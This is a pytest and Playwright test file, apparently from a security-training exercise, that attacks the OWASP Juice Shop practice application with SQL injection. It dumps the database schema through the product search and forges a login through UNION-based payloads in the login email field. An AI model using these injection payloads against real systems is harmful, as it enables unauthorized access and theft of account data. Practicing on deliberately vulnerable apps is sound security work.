import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
import requests
from playwright.sync_api import expect


@pytest.mark.ui
@pytest.mark.api
def test_ct05_login_nonexisting_accountant(playwright_browser, api_headers, config):
    base_url = config['url'].replace('http://localhost:3000', 'https://juice-shop.herokuapp.com')
    url_schema = f"{base_url}/rest/products/search?q=apple')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master --"
    response_schema = requests.get(url_schema, headers=api_headers)
    
    assert response_schema.status_code == config['status']
    
    body = response_schema.text
    assert "CREATE TABLE" in body
    assert any(keyword in body for keyword in ["Users", "Products", "Feedback", "BasketItems"])
    
    email = "' UNION SELECT id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,createdAt,updatedAt,deletedAt FROM Users UNION SELECT 1000, '', 'acc0unt4nt@juice-sh.op2', 'asdfasdf', 'accounting', '', '127.0.0.1', 'default.svg', '', 1, '2020-08-30 11:12:13', '2020-08-30 11:12:13', NULL;"
    password = "1234"
    body_request = {
        "email": email,
        "password": password
    }
    
    url_login = f"{base_url}/rest/user/login"
    response_login = requests.post(url_login, json=body_request, headers=api_headers)
    
    assert response_login.status_code == 200
    json_response = response_login.json()
    assert "authentication" in json_response
    assert "token" in json_response["authentication"]
    
    page = playwright_browser
    page.click("//*[contains(text(),' Account ')]")
    page.click("//*[@id='navbarLoginButton']")
    page.fill("//*[@id='email']", "' UNION SELECT id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,createdAt,updatedAt,deletedAt FROM Users UNION SELECT 1000, '', 'acc0unt4nt@juice-sh.op2', 'asdfasdf', 'accounting', '', '127.0.0.1', 'default.svg', '', 1, '2020-08-30 11:12:13', '2020-08-30 11:12:13', NULL;")
    page.fill("//*[@id='password']", "abcd1234")
    page.click("//*[@id='loginButton']")
    page.click("//*[contains(text(),' Account ')]")
    
    timeout_ms = config['timeout'] * 1000
    page.wait_for_selector("(//span[contains(text(),'admin@juice-sh.op')])[2]", state="visible", timeout=timeout_ms)


if __name__ == "__main__":
    import os
    os.chdir(Path(__file__).parent.parent)
    pytest.main([__file__, "-v"])
